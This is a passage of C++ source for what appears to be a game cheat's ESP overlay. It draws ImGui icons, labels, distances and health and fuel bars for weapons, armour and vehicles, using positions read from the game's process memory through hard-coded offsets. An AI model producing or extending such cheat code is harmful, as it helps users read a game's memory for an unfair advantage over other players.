															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::CrossbowQuick, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::CrossbowQuick, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_CrossBow_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_CrossBow_Quick_Color[0], Setting::Esp_Item_CrossBow_Quick_Color[1], Setting::Esp_Item_CrossBow_Quick_Color[2], Setting::Esp_Item_CrossBow_Quick_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Micro_UZI && Item.Name == u8"(Micro UZI)")
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Micro_UZI_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Micro_UZI_Color[0], Setting::Esp_Item_Micro_UZI_Color[1], Setting::Esp_Item_Micro_UZI_Color[2], Setting::Esp_Item_Micro_UZI_Color[3]), true);
													continue;
												}
												if (Setting::Esp_Item_Holo && Item.Name == u8"Holo")
												{
													if (Setting::Esp_Item_Holo_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Holo, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Holo, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Holo_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Holo_Color[0], Setting::Esp_Item_Holo_Color[1], Setting::Esp_Item_Holo_Color[2], Setting::Esp_Item_Holo_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Lazer && Item.Name == u8"Red Dot")
												{
													if (Setting::Esp_Item_Lazer_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::RedDot, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::RedDot, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Lazer_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Lazer_Color[0], Setting::Esp_Item_Lazer_Color[1], Setting::Esp_Item_Lazer_Color[2], Setting::Esp_Item_Lazer_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_M249 && Item.Name == u8"M249")
												{
													if (Setting::Esp_Item_M249_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::M249, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::M249, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_M249_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_M249_Color[0], Setting::Esp_Item_M249_Color[1], Setting::Esp_Item_M249_Color[2], Setting::Esp_Item_M249_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Mk12 && Item.Name == u8"MK12")
												{
													if (Setting::Esp_Item_Mk12_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Mk12, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Mk12, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Mk14_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Mk14_Color[0], Setting::Esp_Item_Mk14_Color[1], Setting::Esp_Item_Mk14_Color[2], Setting::Esp_Item_Mk14_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Mk14 && Item.Name == u8"MK14")
												{
													if (Setting::Esp_Item_Mk14_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Mk14, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Mk14, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Mk14_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Mk14_Color[0], Setting::Esp_Item_Mk14_Color[1], Setting::Esp_Item_Mk14_Color[2], Setting::Esp_Item_Mk14_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_AMR && Item.Name == u8"AMR")
												{
													if (Setting::Esp_Item_AMR_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::AMR, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::AMR, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Normalfontsize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_AMR_Color[0], Setting::Esp_Item_AMR_Color[1], Setting::Esp_Item_AMR_Color[2], Setting::Esp_Item_AMR_Color[3]), true);
													continue;
												}
												if (Setting::Esp_Item_BulletAMR && Item.Name == u8"AMR Ammo")
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Normalfontsize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_BulletAMR_Color[0], Setting::Esp_Item_BulletAMR_Color[1], Setting::Esp_Item_BulletAMR_Color[2], Setting::Esp_Item_BulletAMR_Color[3]), true);
													continue;
												}
												if (Setting::Esp_Item_Helmet3 && Item.Name == u8"Helmet Lv.3")
												{
													if (Setting::Esp_Item_Helmet3_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::HelmetV3, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::HelmetV3, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Helmet3_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Helmet3_Color[0], Setting::Esp_Item_Helmet3_Color[1], Setting::Esp_Item_Helmet3_Color[2], Setting::Esp_Item_Helmet3_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Frag && Item.Name == u8"Frag Grenade")
												{
													if (Setting::Esp_Item_Frag_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::FragGrenade, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::FragGrenade, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Frag_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Frag_Color[0], Setting::Esp_Item_Frag_Color[1], Setting::Esp_Item_Frag_Color[2], Setting::Esp_Item_Frag_Color[3]), true);
													continue;
													//}

												}
												if (Setting::Esp_Item_Molotof && Item.Name == u8"Molotof")
												{
													if (Setting::Esp_Item_Molotof_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::BurnGrenade, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::BurnGrenade, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Molotof_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Molotof_Color[0], Setting::Esp_Item_Molotof_Color[1], Setting::Esp_Item_Molotof_Color[2], Setting::Esp_Item_Molotof_Color[3]), true);
													continue;
													//}
												}
												if (Item.Name == u8"ACE32")
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Normalfontsize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_BulletAMR_Color[0], Setting::Esp_Item_BulletAMR_Color[1], Setting::Esp_Item_BulletAMR_Color[2], Setting::Esp_Item_BulletAMR_Color[3]), true);
													continue;
												}
											}
										}
									}
								}
							}
							if (Setting::Vehicle)
							{
								if (Data::VehicleList.size() != 0)
								{
									TempVehicalList.clear();
									TempVehicalList = Data::VehicleList;

									for (Vehicle& Vehicle : Data::VehicleList)
									{
										Vehicle.Position = Utility::ReadMemoryEx<VECTOR3>(Utility::ReadMemoryEx<DWORD>(Vehicle.Address + Offset::RootComponent) + Offset::Position);
										if (!Algorithm::WorldToScreen(Data::lOCALPLAYERPosotion, Vehicle.Position, Screen, &Distance, ViewMatrix)) continue;
										if (Distance < 5 || Distance > 700) {
											continue;
										}
										Text = Vehicle.Name + " [" + to_string(Distance) + "M]";
										std::string hp;
										ImVec4 color;
										//if (Vehicle.driving)
										//{
										//	color = DX11::ImGui_DX11::Color::Red;
										//}
										//else {
										//	color = ImColor(Setting::vehcolor[0], Setting::vehcolor[1], Setting::vehcolor[2], Setting::vehcolor[3]);
										//}
										ImVec2 TextSize = DX11::ImGui_DX11::pRegularFont->CalcTextSizeA(vehisize, FLT_MAX, 0.0f, Text.c_str());


										if (VehicleStyle == 0)
										{
											if (Setting::vahicle_Text_item_Plane && Vehicle.Name == u8"Air Plane")
											{

												if (Setting::vahicle_Text_item_Plane_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Plane, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Plane, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_SnowBoard && Vehicle.Name == u8"SnowBoard")
											{

												if (Setting::vahicle_Text_item_SnowBoard_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::SnowBoard, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::SnowBoard, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 30, 125, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 125, 6, Vehicle.hp);

												}
												if (Setting::feul)
												{

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 18, 125, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 125, 6, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Plane_Color[0], Setting::vahicle_Text_item_Plane_Color[1], Setting::vahicle_Text_item_Plane_Color[2], Setting::vahicle_Text_item_Plane_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Plane_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Plane && Vehicle.Name == u8"Helicopter")
											{

												if (Setting::vahicle_Text_item_Helicopter_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Helicopter, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Helicopter, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 30, 125, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 125, 6, Vehicle.hp);

												}
												if (Setting::feul)
												{

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 18, 125, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 125, 6, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Plane_Color[0], Setting::vahicle_Text_item_Plane_Color[1], Setting::vahicle_Text_item_Plane_Color[2], Setting::vahicle_Text_item_Plane_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Plane_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_BRDM && Vehicle.Name == u8"BRDM")
											{

												if (Setting::vahicle_Text_item_BRDM_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::BRDM, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::BRDM, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}

												if (Setting::hp)
												{

													std::string hpveh;

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 30, 87, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 87, 6, Vehicle.hp);

												}
												if (Setting::feul)
												{

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 18, 87, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 87, 6, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_BRDM_Color[0], Setting::vahicle_Text_item_BRDM_Color[1], Setting::vahicle_Text_item_BRDM_Color[2], Setting::vahicle_Text_item_BRDM_Color[3]);
												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_BRDM_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Scooter && Vehicle.Name == u8"Scooter")
											{
												if (Setting::vahicle_Text_item_Scooter_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Scooter, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Scooter, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;
													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 30, 100, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 100, 6, Vehicle.hp);

												}
												if (Setting::feul)
												{

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 18, 100, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 100, 6, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Scooter_Color[0], Setting::vahicle_Text_item_Scooter_Color[1], Setting::vahicle_Text_item_Scooter_Color[2], Setting::vahicle_Text_item_Scooter_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Scooter_TextSize, Text, Screen.X - 16, Screen.Y + 4, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Motorcycle && Vehicle.Name == u8"Motorcycle")
											{
												if (Setting::vahicle_Text_item_Motorcycle_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Motorcycle, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Motorcycle, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;
													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 30, 125, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 125, 6, Vehicle.hp);

												}
												if (Setting::feul)
												{

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 22, 125, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 22, 125, 6, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Motorcycle_Color[0], Setting::vahicle_Text_item_Motorcycle_Color[1], Setting::vahicle_Text_item_Motorcycle_Color[2], Setting::vahicle_Text_item_Motorcycle_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Motorcycle_TextSize, Text, Screen.X - 16, Screen.Y + 4, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Motorcycle3 && Vehicle.Name == u8"Motorcycle 3")
											{
												if (Setting::vahicle_Text_item_Motorcycle_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Motorcycle3, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Motorcycle3, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 30, 125, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 125, 6, Vehicle.hp);

												}
												if (Setting::feul)
												{

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 18, 125, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 125, 6, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Motorcycle3_Color[0], Setting::vahicle_Text_item_Motorcycle3_Color[1], Setting::vahicle_Text_item_Motorcycle3_Color[2], Setting::vahicle_Text_item_Motorcycle3_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Motorcycle3_TextSize, Text, Screen.X - 16, Screen.Y + 4, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Snowmobile && Vehicle.Name == u8"Snowmobile")
											{
												if (Setting::vahicle_Text_item_Snowmobile_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Snowmobile, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Snowmobile, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 30, 131, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 131, 6, Vehicle.hp);

												}
												if (Setting::feul)
												{

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 18, 131, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 131, 6, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Snowmobile_Color[0], Setting::vahicle_Text_item_Snowmobile_Color[1], Setting::vahicle_Text_item_Snowmobile_Color[2], Setting::vahicle_Text_item_Snowmobile_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Snowmobile_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Tuk && Vehicle.Name == u8"Tuk Tuk")
											{
												if (Setting::vahicle_Text_item_Tuk_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Tuk, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Tuk, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 30, 100, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 100, 6, Vehicle.hp);

												}
												if (Setting::feul)
												{

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 18, 100, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 100, 6, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Tuk_Color[0], Setting::vahicle_Text_item_Tuk_Color[1], Setting::vahicle_Text_item_Tuk_Color[2], Setting::vahicle_Text_item_Tuk_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Tuk_TextSize, Text, Screen.X - 16, Screen.Y + 4, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Buggy && Vehicle.Name == u8"Buggy")
											{
												if (Setting::vahicle_Text_item_Buggy_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Buggy, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Buggy, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 30, 90, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 90, 6, Vehicle.hp);

												}
												if (Setting::feul)
												{

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 18, 90, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 90, 6, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Buggy_Color[0], Setting::vahicle_Text_item_Buggy_Color[1], Setting::vahicle_Text_item_Buggy_Color[2], Setting::vahicle_Text_item_Buggy_Color[3]);
												}
												//wheels.append("wheels:").append(std::to_string((int)(wheelscount)));
												//DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, wheels, Screen.X, Screen.Y + 40, ImColor(255, 255, 255, 255), true);

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Buggy_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Sports && Vehicle.Name == u8"Sports")
											{
												if (Setting::vahicle_Text_item_Sports_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Sports, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Sports, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;

